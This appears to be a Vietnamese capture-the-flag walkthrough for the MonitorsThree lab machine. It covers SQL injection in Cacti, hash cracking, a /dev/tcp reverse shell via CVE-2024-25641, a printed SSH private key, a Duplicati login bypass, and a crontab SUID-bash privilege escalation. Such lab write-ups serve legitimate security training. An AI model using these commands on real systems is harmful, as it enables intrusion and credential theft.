# MonitorsThree

<img width="1462" height="647" alt="image" src="https://github.com/user-attachments/assets/a05c0523-cf1e-4182-8aa4-819d8dd4904d" />

Đầu tiên thì tôi dùng nmap để scan các port thì ra được 2 port gồm 22 và 80 là đang mở:

```
❯ sudo nmap -sV 10.10.11.30
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-21 11:50 +0700
Nmap scan report for monitorsthree.htb (10.10.11.30)
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds
```

Giao diện trang web sau khi truy cập bằng trình duyệt:

<img width="1873" height="944" alt="image" src="https://github.com/user-attachments/assets/f183c846-7cd9-43ed-ab0f-fa4442bd21bf" />

Bằng cách fuzz subdomain thì tôi tìm được thêm `http://cacti.monitorsthree.htb/`:

<img width="1870" height="901" alt="image" src="https://github.com/user-attachments/assets/82a8975c-1187-4ce2-a14e-d3579dcb2926" />

Ở đây biết được website sử dụng phiên bản `1.2.26` ở `http://cacti.monitorsthree.htb/` và tìm được [CVE-2024-25641](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)

CVE này liên quan đến upload tệp `.xml.gz` nhưng cần phải đăng nhập vào tài khoản của user có quyền upload package.

Ở chức năng `forgot_password.php` khi tôi nhập `test'` thì có xuất hiện lỗi:

<img width="1653" height="901" alt="image" src="https://github.com/user-attachments/assets/d2875902-e6fd-4826-9455-fe0bcd61bada" />

Có vẻ như xảy ra sqli, kiểm chứng thêm bằng `admin' AND '1'='1`:

<img width="711" height="633" alt="image" src="https://github.com/user-attachments/assets/4c37fd39-1cbb-475c-b021-38aa8b588c9d" />

Tôi viết tạm đoạn script để xử lý sqli base error này và lấy được hash mật khẩu của admin:

<img width="1062" height="899" alt="image" src="https://github.com/user-attachments/assets/27979426-fa07-4cca-8f8c-90497489a2db" />

Ra được cả các mật khẩu khác nhưng không crack được, chỉ crack được mỗi cái hash `31a181c8372e3afc59dab863430610e8` tức mật khẩu của admin là `greencacti2001`:

<img width="1237" height="456" alt="image" src="https://github.com/user-attachments/assets/272aa500-f8d1-44b6-ae2d-3c92134a4353" />

Đăng nhập vào trang web và khám phá thì không thấy gì đáng chú ý lắm:

<img width="1864" height="958" alt="image" src="https://github.com/user-attachments/assets/11d13050-8604-4c56-af8d-e738899a9572" />

Tiếp tục đăng nhập vào `http://cacti.monitorsthree.htb/` bằng cred vừa tìm được:

<img width="1872" height="764" alt="image" src="https://github.com/user-attachments/assets/5d841e6c-5aab-4811-a3cd-e3749fce7201" />

Làm theo hướng dẫn như trong [CVE-2024-25641](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) và thay bằng reverse shell:

```
bash -c 'bash -i >& /dev/tcp/10.10.14.10/1234 0>&1'
```

Ở reverse shell là `www-data`:

```
bash-5.1$ whoami
whoami
www-data
bash-5.1$ pwd
pwd
/var/www/html/cacti
bash-5.1$ 
```

Ở trong `/var/www/html/cacti/include` có file `config.php` có cred của mysql:

<img width="927" height="539" alt="image" src="https://github.com/user-attachments/assets/bc37cbba-5655-4761-b7da-4c72c928ee81" />

Truy cập vào mysql, có database `cacti` và bảng `user_auth` chứa tài khoản và các hash mật khẩu:

```
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfailreset_perms
1	admin	$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G	0	Administrator	marcus@monitorsthree.htb			on	on	on	on	21	1	1	1	on	-1	-1	-1		0	0	436423766
3	guest	$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu	0	Guest Account	guest@monitorsthree.htb			on	on	on		1	11	1	1		-1	-1	-1		0	0	3774379591
4	marcus	$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK	0	Marcus	marcus@monitorsthree.htb		on	on	on	on	on	1	11	1	1	on	-1	-1			0	0	1677427318
bash-5.1$ 
```

Dùng hashcat để crack `hashcat -m 3200 ~/hashcat/target.txt ~/wordlist/rockyou.txt` ra được mật khẩu của marcus là `12345678910`, dù có mật khẩu nhưng vẫn không đăng nhập được do 
thiếu key:

```
❯ ssh marcus@10.10.11.30
marcus@10.10.11.30: Permission denied (publickey).
```

Ở reverse shell, tôi chuyển sang user marcus và có thể đọc được các file trong thư mục của marcus:

```
bash-5.1$ su marcus
su marcus
Password: 12345678910
whoami
marcus
cat ~/user.txt
6dcf2177ed6f67c9074c09a22c7708fd
cat ~/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Tiếp theo là ssh vào với user là marcus:

```
❯ chmod 600 id_rsa
❯ ssh -i id_rsa marcus@10.10.11.30
Last login: Sun Sep 21 05:02:02 2025 from 10.10.14.10
-bash-5.1$ whoami
marcus
-bash-5.1$ pwd
/home/marcus
-bash-5.1$ 
```

Tiếp tục là tôi kiểm tra xem có port nào đang chạy trên server không bằng cách:

```
-bash-5.1$ ss -ltnp
State                Recv-Q                Send-Q                               Local Address:Port                                Peer Address:Port               Process               
LISTEN               0                     4096                                 127.0.0.53%lo:53                                       0.0.0.0:*                                        
LISTEN               0                     70                                       127.0.0.1:3306                                     0.0.0.0:*                                        
LISTEN               0                     500                                        0.0.0.0:8084                                     0.0.0.0:*                                        
LISTEN               0                     4096                                     127.0.0.1:8200                                     0.0.0.0:*                                        
LISTEN               0                     4096                                     127.0.0.1:35293                                    0.0.0.0:*                                        
LISTEN               0                     128                                        0.0.0.0:22                                       0.0.0.0:*                                        
LISTEN               0                     511                                        0.0.0.0:80                                       0.0.0.0:*                                        
LISTEN               0                     128                                           [::]:22                                          [::]:*                                        
LISTEN               0                     511                                           [::]:80                                          [::]:*                                        
-bash-5.1$ curl http://127.0.0.1:8200
-bash-5.1$ curl http://127.0.0.1:8200 -i
HTTP/1.1 302 Redirect
location: /login.html
Date: Sun, 21 Sep 2025 05:04:14 GMT
Content-Length: 0
Content-Type: 
Server: Tiny WebServer
Connection: close
Set-Cookie: xsrf-token=tck8540NEV4nvf%2BHliqLV4OaSJgHP4QNPHXbHPv56dg%3D; expires=Sun, 21 Sep 2025 05:14:14 GMT;path=/; 
```

Dùng `ssh -L 8200:localhost:8200 marcus@10.10.11.30 -i id_rsa` để nối port ra ngoài máy thật:

<img width="1786" height="401" alt="image" src="https://github.com/user-attachments/assets/0635e541-1d3e-4fc4-a033-ad6b1f31961c" />

<img width="1835" height="424" alt="image" src="https://github.com/user-attachments/assets/7e46f1a6-1a82-43fd-a1cc-4c5513b01e24" />

Thử tra google thì ra được cách bypass login của [Duplicati](https://github.com/duplicati/duplicati/issues/5197), nhưng chưa có `Server_passphrase`.

Tôi tìm được `Duplicati-server.sqlite`:

```
-bash-5.1$ ls -la /opt/duplicati/config/
total 4100
drwxr-xr-x 4 root root    4096 Sep 20 15:40 .
drwxr-xr-x 3 root root    4096 Aug 18  2024 ..
drwxr-xr-x 3 root root    4096 Aug 18  2024 .config
-rw------- 1 root root  200704 Sep 20 15:25 BGURDWJUJC.sqlite
-rw-r--r-- 1 root root 3158016 Sep 20 15:24 CTADPNHLTC.sqlite
-rw-r--r-- 1 root root   90112 Sep 20 15:40 Duplicati-server.sqlite
-rw------- 1 root root  163840 Sep 20 15:32 GRHMURJHNZ.sqlite
-rw------- 1 root root  163840 Sep 20 15:24 NGWRUDOVCV.sqlite
-rw------- 1 root root  163840 Sep 20 15:34 ROUBTTLKHW.backup
-rw------- 1 root root  217088 Sep 20 15:34 ROUBTTLKHW.sqlite
drwxr-xr-x 2 root root    4096 Aug 18  2024 control_dir_v2
```

Tải file sqlite về và tìm được `server-passphrase`:

```
sqlite> .table
Backup        Log           Option        TempFile    
ErrorLog      Metadata      Schedule      UIStorage   
Filter        Notification  Source        Version     
sqlite> select * from Source
   ...> ;
4|/source/var/www/html/cacti/
sqlite> select * from Backup;
4|Cacti 1.2.26 Backup|||file:///source/opt/backups/cacti/|/config/CTADPNHLTC.sqlite
sqlite> select * from Option;
4||encryption-module|
4||compression-module|zip
4||dblock-size|50mb
4||--no-encryption|true
-1||--asynchronous-upload-limit|50
-1||--asynchronous-concurrent-upload-limit|50
-2||startup-delay|0s
-2||max-download-speed|
-2||max-upload-speed|
-2||thread-priority|
-2||last-webserver-port|8200
-2||is-first-run|
-2||server-port-changed|True
-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
-2||server-passphrase-trayicon|875c45fb-9d07-4fef-90a7-da78b963c5f1
-2||server-passphrase-trayicon-hash|6TpTb6pP/kFODLzi3SbrqNYUz5AYfwioAyOizerKWic=
-2||last-update-check|638939451468891080
-2||update-check-interval|
-2||update-check-latest|
-2||unacked-error|False
-2||unacked-warning|False
-2||server-listen-interface|any
-2||server-ssl-certificate|
-2||has-fixed-invalid-backup-id|True
-2||update-channel|
-2||usage-reporter-level|
-2||has-asked-for-password-protection|true
-2||disable-tray-icon-login|false
-2||allowed-hostnames|*
```

<img width="1516" height="640" alt="image" src="https://github.com/user-attachments/assets/70c27a89-47b3-4413-8437-cb395841c7ed" />

Đăng nhập vào thì có giao diện như này:

<img width="1860" height="699" alt="image" src="https://github.com/user-attachments/assets/2db1fb06-2b40-49cd-a799-f9382f0e172c" />

Tôi thử dùng để backup lại file `/etc/crontab` do file này tôi có quyền đọc được. 

Tôi copy file `/etc/crontab` về và sửa bằng cách thêm `chmod 4755 /bin/bash` được chạy dưới quyền root nhằm thay đổi quyền của `/bin/bash`:

<img width="1101" height="574" alt="image" src="https://github.com/user-attachments/assets/350fbeb7-2104-42d1-a397-a945ea576410" />

Tiếp tục là dùng trang web để backup lại: 

<img width="1838" height="495" alt="image" src="https://github.com/user-attachments/assets/5fac8ae4-0a32-4bd2-ab0d-f061538b2db8" />

<img width="1145" height="807" alt="image" src="https://github.com/user-attachments/assets/210433fd-3862-4db4-a0bf-1d22cf405cb2" />

<img width="1370" height="782" alt="image" src="https://github.com/user-attachments/assets/f4414008-48a4-46ff-9868-d8052e734386" />

<img width="1699" height="795" alt="image" src="https://github.com/user-attachments/assets/bb2beb17-7ad6-4e8a-ae10-04ade4114650" />

<img width="1708" height="644" alt="image" src="https://github.com/user-attachments/assets/2a0ea00f-7da5-421e-a10a-116f80844da8" />

<img width="1192" height="594" alt="image" src="https://github.com/user-attachments/assets/e7acbada-7d3c-4ce3-b8c3-7df762561a1c" />

Sau đó ấn `Run now`, khi ấn thì có cảnh báo hiện lên, ấn `repair` và reload lại trang web:

<img width="1083" height="513" alt="image" src="https://github.com/user-attachments/assets/dd125dfd-826b-4805-a6a1-d49c2d7bc5b9" />

<img width="1729" height="561" alt="image" src="https://github.com/user-attachments/assets/008afd44-6970-4aa2-8aaa-8a0587c3adae" />

<img width="1705" height="729" alt="image" src="https://github.com/user-attachments/assets/c194b37f-b05e-4254-b371-c1acf13a2810" />

Sau đó chọn `/etc` và `Overwrite`:

<img width="1712" height="775" alt="image" src="https://github.com/user-attachments/assets/41b66d1a-529f-4c08-be70-138e4fade791" />

Lúc này nội dung của `/etc/crontab` đã được thay đổi, đợi thêm 1 tí và dùng `/bin/bash -p` để lên quyền root:

```
-bash-5.1$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    chmod 4755 /bin/bash
#
-bash-5.1$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
e0484aa963d359ba20e42240ea7c153d
bash-5.1# 
```
